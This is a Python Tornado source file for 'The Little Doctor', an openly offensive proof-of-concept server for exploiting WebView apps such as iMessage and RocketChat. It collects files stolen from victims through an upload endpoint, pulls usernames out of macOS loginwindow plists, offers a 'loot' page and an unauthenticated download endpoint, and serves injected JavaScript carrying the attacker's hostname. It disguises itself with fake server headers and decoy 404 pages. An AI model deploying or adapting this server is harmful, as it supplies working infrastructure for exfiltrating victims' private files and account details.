"""
The Little Doctor

This is a very simple PoC server for exploiting a few WebView apps, like
iMessage (patched), and RocketChat (also patched), but much of the code
can be reused to exploit other apps too, enjoy.

@author: mandatory, moloch, shubs
"""
# pylint: disable=C0103,C0111,R0201,W0223


import gzip
import logging
import os
import functools
from uuid import uuid4

from biplist import readPlistFromString
from tornado.httpserver import HTTPServer
from tornado.ioloop import IOLoop
from tornado.options import options
from tornado.web import Application, RequestHandler, StaticFileHandler

USER_ID = "user_id"

####### Helpers #######
def known_user(method):
    ''' Checks to see if a user has been authenticated '''

    @functools.wraps(method)
    def wrapper(self, *args, **kwargs):
        if self.get_current_user() is not None:
            return method(self, *args, **kwargs)
        else:
            self.set_status(403)
            self.write({"errors": ["You are not authenticated"]})
    return wrapper



####### Persistent Data Store #######
class FileSystemDataStore(object):

    """ Dictionary-like persistent data store (filesystem) """

    NAME = "filesystem"
    DATA_DIRECTORY = os.path.abspath(options.data_directory)

    @classmethod
    def user_ids(cls):
        user_ids = []
        for user_id in os.listdir(cls.DATA_DIRECTORY):
            if os.path.isdir(os.path.join(cls.DATA_DIRECTORY, user_id)):
                user_ids.append(user_id)
        logging.debug('User IDs: %r', user_ids)
        return user_ids

    def __init__(self, user_id):
        if user_id is None:
            raise ValueError("Invalid User ID")
        user_id = os.path.basename(user_id)
        self.data_path = os.path.join(self.DATA_DIRECTORY, user_id)
        if not os.path.exists(self.data_path):
            os.mkdir(self.data_path)

    def __contains__(self, key):
        return key in os.listdir(self.data_path)

    def __getitem__(self, key):
        path = os.path.join(self.data_path, os.path.basename(key))
        if not os.path.exists(path):
            return None
        with gzip.open(path, mode="rb") as data_file:
            return data_file.read()

    def __setitem__(self, key, value):
        path = os.path.join(self.data_path, os.path.basename(key))
        if os.path.exists(path):
            collision_key = os.path.basename("%s_%s" % (key, str(uuid4()),))
            path = os.path.join(self.data_path, collision_key)
        with gzip.open(path, mode="wb") as data_file:
            data_file.write(value)

    def __delitem__(self, key):
        key = os.path.basename(key)
        os.unlink(os.path.join(self.data_path, key))

    def __iter__(self):
        for key in self.keys():
            yield key

    def iteritems(self):
        for key in self.keys():
            yield (key, self[key],)

    def keys(self):
        return os.listdir(self.data_path)


####### Request Handlers #######
class BaseRequestHandler(RequestHandler):

    def set_default_headers(self):
        self.set_header("Server", "Microsoft-IIS/7.5")
        self.set_header("X-Powered-By", "PHP/5.2.17")
        self.set_header("X-AspNet-Version", "2.0.50727")
        self.set_header("Access-Control-Allow-Origin", self.request.host)
        self.set_header("Access-Control-Allow-Credentials", "true")
        self.set_header("Access-Control-Allow-Headers", "X-Filename")
        self.set_header("Access-Control-Expose-Headers", "X-Filename")

    def get_current_user(self):
        return self.get_secure_cookie(USER_ID, None)

    @property
    def data_store(self):
        if self.get_current_user() is not None:
            return FileSystemDataStore(self.get_current_user())


class LoginHandler(BaseRequestHandler):

    """ Just assigns a random id value so we can track the client """

    def get(self):
        user = self.get_current_user()
        if user is None:
            user_id = os.urandom(16).encode('hex')
            self.set_secure_cookie(USER_ID, user_id)
        else:
            logging.info("Known user: %r", self.get_current_user())


class FileUploadHandler(BaseRequestHandler):

    @known_user
    def post(self):
        filename = self.request.headers.get("X-Filename", str(uuid4()))
        self.data_store[filename] = self.request.body


class PlistParserHandler(BaseRequestHandler):

    """
    Extracts data from the .plist and start a new session, hopefully
    this library isn't vulnerable to XXE, I never bothered testing it.
    """

    PLIST_FILENAME = "com.apple.loginwindow.plist"

    def get_username_from_plist(self, plist_raw_data):
        plist_data = readPlistFromString(plist_raw_data)
        return plist_data.get("lastUserName", None)

    def post(self):
        """ Login a new user """
        try:
            username = self.get_username_from_plist(self.request.body)
            if self.get_current_user() is not None:
                self.data_store["username.txt"] = username
                self.data_store[self.PLIST_FILENAME] = self.request.body
            self.set_header("Content-type", "text/plain")
            self.write(username)
        except:
            self.set_status(400)
            self.write('')


class DownloadHandler(BaseRequestHandler):

    """ Again totally unauthenticated by design """

    def get(self):
        user_id = self.get_query_argument("user_id")
        filename = self.get_query_argument("filename")
        if user_id in FileSystemDataStore.user_ids():
            data_store = FileSystemDataStore(user_id)
            if filename in data_store:
                self.set_header("Content-type", "application/octet-stream")
                self.set_header("Content-Disposition",
                                "attachment; filename=\"%s\"" % filename)
                self.write(data_store[filename])
            else:
                self.set_status(404)
        else:
            self.set_status(404)


class LootHandler(BaseRequestHandler):

    """
    This is totally unauthenticated to discourage people from actually using it,
    if you can write you own authentication mechanism we assume you're smart enough
    to write the rest of the code too, so it wouldn't really matter.
    """

    def get(self):
        self.render("templates/loot.html")


class FourOhFourHandler(BaseRequestHandler):

    def get(self, *args, **kwargs):
        self.set_status(404)
        self.write("""
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.2.3 (CentOS)</address>
</body>
</html>
""")


class LittleDoctorJsHandler(BaseRequestHandler):

    """
    Shitty way to do this but once we get JS execution there's no way to
    determine the server hostname (depending on the type of injection) so
    we just gotta hardcode it in the JavaScript.
    """

    _LITTLE_DOCTOR_JS = "js/dist/main/little-doctor.js"
    _LITTLE_DOCTOR_JS_MAP = "js/dist/main/little-doctor.js.map"

    def get(self, *args):
        """ The modules are loaded via RequireJS this is just the main.js """
        if len(args) and args[0].endswith(".map") and options.debug:
            self.set_header("Content-Type", "text/plain")
            with open(self._LITTLE_DOCTOR_JS_MAP) as fp:
                self.write(fp.read())
        else:
            self.set_header("Content-Type", "application/javascript")
            with open(self._LITTLE_DOCTOR_JS) as fp:
                js = fp.read().replace("__LITTLE_DOCTOR_HOSTNAME__", options.hostname)
                js = js.replace("__LITTLE_DOCTOR_LISTEN_PORT__", options.listen_port)
                js = js.replace("__LITTLE_DOCTOR_SCHEME__", options.scheme)
                self.write(js)


LITTLE_DOCTOR_HANDLERS = [
    (r"/loot", LootHandler),

    (r"/login", LoginHandler),
    (r"/plist", PlistParserHandler),
    (r"/download", DownloadHandler),
    (r"/upload", FileUploadHandler),

    (r"/js/(.*)", LittleDoctorJsHandler),
    (r"/modules/(.*)", StaticFileHandler, {"path": "js/dist/modules"}),

    (r"/(.*)", FourOhFourHandler)
]


def start_app():
    """ Create and start the app object """
    little_doctor = Application(
        handlers=LITTLE_DOCTOR_HANDLERS,
        debug=options.debug,
        cookie_secret=options.cookie_secret)
    server = HTTPServer(little_doctor,
                        xheaders=options.x_headers)
    server.listen(options.listen_port)
    io_loop = IOLoop.instance()
    try:
        logging.info("Starting Little Docter server on %s://%s:%s",
                     options.scheme, options.hostname, options.listen_port)
        io_loop.start()
    except KeyboardInterrupt:
        logging.warn("Keyboard interrupt, shutdown everything!")
    finally:
        io_loop.stop()
